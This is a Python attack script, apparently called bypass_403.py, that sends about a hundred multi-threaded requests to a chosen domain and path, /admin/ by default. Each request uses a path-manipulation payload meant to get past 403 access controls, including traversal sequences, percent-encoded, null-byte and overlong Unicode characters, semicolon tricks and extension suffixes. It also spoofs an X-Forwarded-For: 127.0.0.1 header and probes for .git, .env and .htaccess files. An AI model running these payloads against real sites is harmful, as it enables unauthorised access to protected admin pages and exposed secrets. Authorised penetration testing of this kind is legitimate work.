import requests
import sys
import threading

# Check if domain argument is provided
if len(sys.argv) < 2:
    print("Usage: python bypass_403.py <target-domain> [optional-path]")
    sys.exit(1)

# Target domain from command-line argument
base_url = f"http://{sys.argv[1]}"  # Change to https:// if needed

# If user provides a path, use it. Otherwise, use default paths.
user_path = sys.argv[2] if len(sys.argv) > 2 else "/admin/"

# Common access control bypass techniques
paths = [
    f"{user_path}", f"{user_path}?", f"{user_path}//", f"{user_path}///", f"{user_path}////",
    f"{user_path}./", f"{user_path}../", f"{user_path}/././", f"{user_path}//..//",
    f"{user_path}%20", f"{user_path}%20/", f"{user_path}%09", f"{user_path}%09/",
    f"{user_path}%0a", f"{user_path}%0a/", f"{user_path}%0d", f"{user_path}%0d/",
    f"{user_path}%23", f"{user_path}%23/", f"{user_path}%3f", f"{user_path}%3f/",
    f"{user_path}%25", f"{user_path}%25/", f"{user_path}%2f", f"{user_path}%2f/",
    f"{user_path};%2f", f"{user_path};.json", f"{user_path};", f"{user_path};/",
    f"{user_path}?.json", f"{user_path}??", f"{user_path}??/", f"{user_path}?id=1",
    f"{user_path}&", f"{user_path}#", f"{user_path}./", f"{user_path}~", f"{user_path}/~",
    f"{user_path}*", f"{user_path}/*", f"{user_path};/", f"{user_path}..;/", f"{user_path}../",
    f"/%2e{user_path}", f"/%2e{user_path}/", f"/%2e%2e{user_path}", f"/%2e%2e{user_path}/",
    f"/././{user_path}", f"{user_path}/..%3B/", f"{user_path}/;%2f..%2f..%2f",
    f"/..;{user_path}", f"/..;{user_path}/", f"/.;{user_path}", f"/.;{user_path}/",
    f"{user_path}.css", f"{user_path}.html", f"{user_path}.json", f"{user_path}.txt",
    f"{user_path}/?.php", f"{user_path}.asp", f"{user_path}.aspx", f"{user_path}.xml",
    f"{user_path}/.json", f"{user_path}.%00/", f"{user_path}%00", f"{user_path}%20.json",
    f"{user_path}/;", f"{user_path}\\", f"{user_path}/\\", f"{user_path}\\/",
    f"{user_path}\\..\\", f"{user_path}/..\\", f"{user_path}/%2e", f"{user_path}/%2e/",
    f"{user_path}%252e%252e/", f"{user_path}%252f/", f"{user_path}%253b/",
    f"{user_path}/./..//", f"{user_path}/.//.", f"{user_path}/..;./", f"{user_path}/..;/%2f",
    f"{user_path}/%c0%ae/", f"{user_path}/%c0%ae%c0%ae/", f"{user_path}/%u2215/",
    f"{user_path}%u002e%u002e%u2215", f"{user_path}%u2215/",
    f"/%2e%2e/%2e%2e/%2e%2e{user_path}/", f"/%2f%2f%2f{user_path}/",
    f"{user_path}/~dev", f"{user_path}/.git", f"{user_path}/.svn", f"{user_path}/.htaccess",
    f"{user_path}/.DS_Store", f"{user_path}/.well-known", f"{user_path}/.env",
]

# Headers to mimic real browsers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Referer": base_url,
    "X-Forwarded-For": "127.0.0.1",
    "Origin": base_url,
}

# Function to test each URL variation
def test_bypass(path):
    url = base_url + path
    try:
        response = requests.get(url, headers=headers, allow_redirects=False)
        if response.status_code == 200:  
            print(f"\033[92m[+] ACCESS GRANTED: {url} --> Status: {response.status_code}\033[0m")
        elif response.status_code == 403:  
            print(f"\033[91m[-] BLOCKED: {url} --> Status: {response.status_code}\033[0m")
        else:
            print(f"\033[93m[*] INTERESTING RESPONSE: {url} --> Status: {response.status_code}\033[0m")
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[!] ERROR: {url} --> {e}\033[0m")

# Multi-threaded execution for faster testing
threads = []
for path in paths:
    thread = threading.Thread(target=test_bypass, args=(path,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()